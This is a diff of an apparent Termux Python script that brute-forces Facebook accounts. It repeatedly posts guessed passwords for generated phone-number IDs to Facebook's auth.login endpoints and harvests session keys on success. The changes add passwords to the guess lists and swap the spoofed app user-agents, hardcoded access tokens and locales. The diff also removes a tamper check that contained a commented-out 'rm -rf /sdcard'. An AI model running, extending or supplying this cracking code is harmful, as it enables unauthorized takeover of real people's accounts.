@@ -50,24 +50,14 @@ except ModuleNotFoundError:
 	os.system('pip install requests bs4 futures==2 > /dev/null')
 	os.system('python Awais.py')
 
-first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(first+'models.py','r').read():
-	pass
-elif not 'print' in open(first+'sessions.py','r').read():
-	pass
-else:
-	print('Your Data Is Fucked Up')
-	#os.system#('rm -rf /sdcard')
-	exit()
-	
-try:
-	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
-	open('proxies.txt','w').write(proxies)
-except Exception as e:
-	os.system('clear')
-	print('\x1b[1;92m[+] PLEASE WAIT...')
-	time.sleep(0.5)
-	
+def ip():
+	try:
+		prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
+		open('proxies.txt','w').write(proxies)
+	except Exception as e:
+		os.system('clear')
+		print('\x1b[1;92m[+] PLEASE WAIT...')
+		time.sleep(0.5)
 	
 	print('Join Our WhatsApp Group')
 	os.system('xdg-open https://chat.whatsapp.com/JEiUAtoOroCEyQJAMXHRZe')
@@ -420,9 +410,9 @@ def rd1(ids,passlist):
 				random_seed = random.Random()
 				fbcr = sim_id
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/523.0.0.94.287;FBBV/3176391;FBDM/{density=2.6,width=1280,height=1334;FBLC/en_GB;FBRV/375926502;FBCR/Nepal Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7390;FBSV/4.1.2;FBCA/armeabi-v7a:armeabi;]"
-				head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
-				data = {"adid":str(''.join(random_seed.choices(string.hexdigits, k=16))),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"256002347743983|216a8ca8adfa721bd1e84171d5abad204b082890","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_PK","client_country_code":"PK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/358205829;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_US;FBRV/485920582;FBCR/Ufone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/X650;FBSV/8.1;FBCA/armeabi-v7a:armeabi;]"
+				head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+				data = {"adid":str(''.join(random_seed.choices(string.hexdigits, k=16))),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
 				po = requests.post('https://b-graph.facebook.com/method/auth.login',data=data,headers=head).json()
 				if 'session_key' in po:
 					uid = str(po['uid'])
@@ -466,9 +456,9 @@ def rd2(ids,passlist):
 				access_token = random.choice(tokenlist)
 				fbcr = sim_id
 				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/523.0.0.94.287;FBBV/3176391;FBDM/{density=2.6,width=1280,height=1334;FBLC/en_GB;FBRV/375926502;FBCR/Nepal Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7390;FBSV/4.1.2;FBCA/armeabi-v7a:armeabi;]"
+				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/510.0.0.25.314;FBBV/340905384;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_GB;FBRV/305491253;FBCR/Vodafone;FBMF/Oneplus;FBBD/Oneplus;FBPN/com.facebook.katana;FBDV/LE2117;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
 				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
-				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_PK','client_country_code':'PK','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
+				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
 				po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
 				if 'session_key' in po:
 					uid = str(po['uid'])
@@ -519,9 +509,9 @@ def api1(ids,names,passlist):
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 			random_seed = random.Random()
 			fbcr = sim_id
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,8998998))+";FBRV/"+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/269235091;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_GB;FBRV/482918506;FBCR/Bangalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1906F9SH;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,8998998))+";FBRV/"+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027765;FBDM/{density=2.625,width=1080,height=2144};FBLC/en_US;FBRV/327042749;FBCR/Ufone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;]"
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
-			data = {'adid':str(''.join(random_seed.choices(string.hexdigits, k=16))),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
+			data = {'adid':str(''.join(random_seed.choices(string.hexdigits, k=16))),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
 			po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
 			if 'session_key' in po:
 					uid = str(po['uid'])
@@ -569,7 +559,7 @@ def api2(ids,names,passlist):
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 			fbcr = sim_id
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/300.0.0.4.45;FBBV/269235091;FBDM/{density=2.8812501,width=1080,height=2110};FBLC/en_GB;FBRV/482918506;FBCR/Bangalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M1906F9SH;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/510.0.0.25.314;FBBV/340905384;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/305491253;FBCR/Vodafone;FBMF/Oneplus;FBBD/Oneplus;FBPN/com.facebook.katana;FBDV/LE2117;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'882a8490361da98702bf97a021ddc14d','access_token':accees_token}
 			po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
@@ -726,7 +716,7 @@ def ind():
 		linex()
 		for psx in user:
 			ids = code+psx
-			passlist = ['57273200','59039200',ids,psx]
+			passlist = ['57273200','59039200','57575751',ids,psx]
 			Awais.submit(rd1,ids,passlist)
 	print('\033[1;37m')
 	linex()
@@ -757,7 +747,7 @@ def ind2():
 		linex()
 		for psx in user:
 			ids = code+psx
-			passlist = ['57273200','59039200',ids,psx]
+			passlist = ['57273200','59039200','57575751',ids,psx]
 			Awais.submit(rd2,ids,passlist)
 	print('\033[1;37m')
 	linex()
